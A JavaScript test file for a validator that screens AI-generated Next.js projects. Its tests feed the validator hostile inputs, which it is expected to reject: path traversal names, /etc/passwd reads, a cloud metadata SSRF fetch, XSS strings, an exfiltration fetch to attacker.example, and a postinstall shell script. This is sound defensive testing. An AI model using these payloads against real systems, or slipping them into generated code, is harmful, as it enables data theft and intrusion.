import test from 'node:test';
import assert from 'node:assert/strict';

import { validateGeneratedFiles } from '../src/security/validate-files.mjs';

const valid = {
  'app/layout.tsx':
    'export default function Layout({children}) { return <html><body>{children}</body></html> }',
  'app/page.tsx': 'export default function Page() { return <main>Business website</main> }',
  'app/globals.css': 'body { margin: 0; }',
};

function rejected(extra, code = /GENERATED_PROJECT_UNSAFE/) {
  assert.throws(() => validateGeneratedFiles({ ...valid, ...extra }), code);
}

test('accepts a bounded Next.js App Router source-only file map', () => {
  assert.deepEqual({ ...validateGeneratedFiles(valid) }, valid);
});

test('rejects Unix, Windows, encoded, normalized, and malformed traversal paths', () => {
  rejected({ '../secret.ts': 'x' });
  rejected({ '/etc/passwd.ts': 'x' });
  rejected({ 'C:\\Windows\\secret.ts': 'x' });
  rejected({ '%2e%2e/secret.ts': 'x' });
  rejected({ 'app/../secret.ts': 'x' });
  rejected({ 'app/e\u0301.ts': 'x' });
  rejected({ 'app/\ud800.ts': 'x' });
});

test('rejects environment, process, filesystem, shell, and infrastructure access', () => {
  for (const source of [
    'process.env.API_KEY',
    "import fs from 'node:fs'",
    "import {spawn} from 'child_process'",
    "fetch('http://169.254.169.254/latest/meta-data')",
    "fetch('http://localhost:8000/internal')",
    "Deno.run({cmd:['sh']})",
    "Bun.spawn(['sh'])",
    "readFile('/etc/passwd')",
    '<svg onload="alert(1)"></svg>',
    '<iframe src="https://attacker.example"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    "fetch('https://attacker.example/exfiltrate')",
    'window.location = "https://attacker.example"',
    '@import "https://attacker.example/theme.css";',
  ]) {
    rejected({ 'app/unsafe.ts': source });
  }
});

test('rejects dependency manifests, lifecycle scripts, binaries, and unsupported files', () => {
  rejected({ 'package.json': '{"scripts":{"postinstall":"sh"}}' });
  rejected({ 'app/payload.exe': 'binary' });
  rejected({ 'public/binary.txt': 'safe\u0000hidden' }, /GENERATED_PROJECT_INVALID/);
  rejected({ 'app/giant.ts': 'x'.repeat(250_001) }, /GENERATED_PROJECT_INVALID/);
});

test('rejects missing entry points, too many files, and oversized projects', () => {
  assert.throws(
    () => validateGeneratedFiles({ 'app/page.tsx': valid['app/page.tsx'] }),
    /GENERATED_PROJECT_INVALID/,
  );
  const tooMany = { ...valid };
  for (let index = 0; index < 181; index += 1) tooMany[`app/p${index}.ts`] = 'export {}';
  assert.throws(() => validateGeneratedFiles(tooMany), /GENERATED_PROJECT_INVALID/);
  const oversized = { ...valid };
  for (let index = 0; index < 11; index += 1) oversized[`app/s${index}.txt`] = 'x'.repeat(240_000);
  assert.throws(() => validateGeneratedFiles(oversized), /GENERATED_PROJECT_INVALID/);
});
